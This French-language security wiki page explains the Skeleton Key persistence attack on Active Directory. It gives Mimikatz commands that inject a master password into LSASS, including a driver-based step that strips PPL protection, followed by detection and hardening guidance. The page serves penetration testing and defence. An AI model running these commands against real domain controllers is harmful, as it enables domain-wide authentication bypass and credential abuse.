# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

L’**attaque Skeleton Key** est une technique qui permet aux attaquants de **contourner l’authentification Active Directory** en **injectant un mot de passe maître** dans le processus LSASS de chaque contrôleur de domaine. Après l’injection, le mot de passe maître (par défaut **`mimikatz`**) peut être utilisé pour s’authentifier en tant que **n’importe quel utilisateur du domaine**, tandis que leurs mots de passe réels continuent de fonctionner.<sup>[[1]](#references)[[2]](#references)</sup>

Faits importants :

- Nécessite **Domain Admin/SYSTEM + SeDebugPrivilege** sur chaque DC et doit être **réappliqué après chaque redémarrage**.<sup>[[2]](#references)</sup>
- L’implémentation classique de Mimikatz patche les chemins de validation **NTLM** et **Kerberos RC4 (etype 0x17)** ; l’authentification utilisant uniquement AES **n’accepte pas ce mot de passe skeleton via le hook RC4**.<sup>[[2]](#references)</sup>
- Peut entrer en conflit avec des packages d’authentification LSA tiers ou des fournisseurs supplémentaires de smart card / MFA.<sup>[[2]](#references)</sup>
- Le module Mimikatz accepte le switch facultatif `/letaes` afin d’éviter de modifier les hooks Kerberos/AES en cas de problèmes de compatibilité.<sup>[[3]](#references)</sup>

### Exécution

LSASS classique, non protégé par PPL :
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Si **LSASS s’exécute en tant que protected process light (PPL)**, l’accès de débogage en mode utilisateur est bloqué. La procédure historique de Mimikatz ci-dessous charge son pilote kernel et supprime la protection avant de patcher LSASS. Credential Guard est un contrôle d’isolation distinct et ne doit pas être utilisé comme synonyme de PPL.<sup>[[3]](#references)[[4]](#references)</sup>
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Après l’injection, authentifiez-vous avec n’importe quel compte du domaine, mais utilisez le mot de passe `mimikatz` (ou la valeur définie par l’opérateur). N’oubliez pas de répéter l’opération sur **tous les DC** dans les environnements comportant plusieurs DC.

## Mitigations

- **Surveillance des logs**
- **Event ID 7045** du système (installation d’un service/driver) pour les drivers non signés tels que `mimidrv.sys`.
- **Sysmon** : Event ID 7 (chargement d’un driver) pour `mimidrv.sys` ; Event ID 10 pour les accès suspects à `lsass.exe` depuis des processus non système.
- **Event ID 4673/4611** de sécurité pour l’utilisation de privilèges sensibles ou les anomalies d’enregistrement de packages d’authentification LSA ; corrélez-les avec les ouvertures de session 4624 inattendues utilisant RC4 (etype 0x17) depuis les DC.
- **Renforcement de LSASS**
- Maintenez **RunAsPPL** et **Credential Guard** activés lorsqu’ils sont pris en charge. Ils fournissent des protections différentes et, ensemble, augmentent le coût et la télémétrie des tentatives de modification ou d’extraction des secrets de LSASS.<sup>[[4]](#references)</sup>
- Désactivez **RC4** legacy lorsque cela est possible ; les tickets Kerberos limités à AES empêchent le chemin de hook RC4 utilisé par le skeleton key.<sup>[[2]](#references)</sup>
- Recherches PowerShell rapides :
- Détecter les installations de kernel drivers non signés : `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Rechercher le driver de Mimikatz : `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Vérifier que PPL est appliqué après le redémarrage : `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

Pour obtenir des recommandations supplémentaires sur le renforcement des credentials, consultez [Windows credentials protections](../stealing-credentials/credentials-protections.md).

## References

- [1] [Netwrix – Attaque Skeleton Key dans Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [2] [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [3] [TheHacker.Tools – Module misc::skeleton de Mimikatz](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)
- [4] [Microsoft Learn — Configurer la protection LSA supplémentaire](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
